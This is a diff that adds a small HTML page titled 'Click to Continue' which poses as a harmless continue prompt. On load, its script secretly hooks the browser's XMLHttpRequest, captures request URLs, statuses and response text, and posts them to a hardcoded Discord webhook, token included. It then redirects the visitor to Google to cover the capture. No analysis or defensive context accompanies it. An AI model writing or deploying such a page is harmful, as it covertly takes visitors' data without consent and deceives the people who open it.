@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click to Continue</title>
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1330616566857072742/qwmUfJoIlFnSK1UmMp90Aa2DP5RAJiotQCaHahu3Iw3xVw34OobZSmHY0CuphvnfjkDa";
+
+        async function sendToDiscord(data) {
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: "```json\n" + data + "\n```" })
+                });
+            } catch (error) {
+                console.error("Failed to send to Discord:", error);
+            }
+        }
+
+        function captureNetworkRequests() {
+            let open = window.XMLHttpRequest.prototype.open;
+            window.XMLHttpRequest.prototype.open = function() {
+                this.addEventListener("load", function() {
+                    const log = {
+                        type: "XHR",
+                        url: this.responseURL,
+                        status: this.status,
+                        response: this.responseText.substring(0, 500) // Limit response size
+                    };
+                    sendToDiscord(JSON.stringify(log, null, 2));
+                });
+                return open.apply(this, arguments);
+            };
+        }
+
+        function init() {
+            captureNetworkRequests();
+            setTimeout(() => {
+                window.location.href = "https://www.google.com"; // Redirect to Google
+            }, 2000); // Delay redirect for 2 seconds
+        }
+    </script>
+</head>
+<body onload="init()">
+    <h1>Click below to continue</h1>
+    <a href="#" onclick="init()">Continue</a>
+</body>
+</html>
